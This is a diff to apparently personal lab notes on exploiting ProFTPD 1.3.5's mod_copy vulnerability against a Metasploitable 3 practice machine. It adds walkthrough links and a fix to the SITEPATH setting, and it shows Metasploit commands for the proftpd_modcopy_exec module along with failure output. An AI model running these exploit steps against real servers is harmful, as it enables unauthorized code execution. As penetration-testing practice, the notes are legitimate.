@@ -1,5 +1,8 @@
 # Attacking Proftpd 1.3.5
 - https://blog.securelayer7.net/metasploitable-3-walkthrough/
+- https://medium.com/@samare243/metasploitable3-walkthrough-b3cf7195c497
+
+## First try ==> fail
 ```
 msf5 > search proftpd 1.3.5
 msf5 > use exploit/unix/ftp/proftpd_modcopy_exec
@@ -61,7 +64,7 @@ msf5 exploit(unix/ftp/proftpd_modcopy_exec) > run
 [-] 10.0.3.5:80 - Exploit aborted due to failure: unknown: 10.0.3.5:21 - Failure copying PHP payload to website path, directory not writable?
 [*] Exploit completed, but no session was created.
 ```
-
+- comment :SITEPATH   /var/www ==>  SITEPATH   /var/www/html
 # Success
 ```
 msf5 exploit(unix/ftp/proftpd_modcopy_exec) > set SITEPATH /var/www/html
